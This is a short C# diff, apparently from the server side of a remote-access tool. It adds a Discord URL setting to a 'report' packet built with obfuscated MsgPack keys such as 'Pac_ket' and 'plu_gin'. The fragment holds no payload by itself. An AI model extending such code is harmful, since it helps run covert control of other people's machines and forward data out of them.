@@ -2310,6 +2310,7 @@ namespace Server
             {
                 MsgPack packet = new MsgPack();
                 packet.ForcePathObject("Pac_ket").AsString = "report";
+                packet.ForcePathObject("discordurl").AsString = Properties.Settings.Default.DiscordUrl;
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
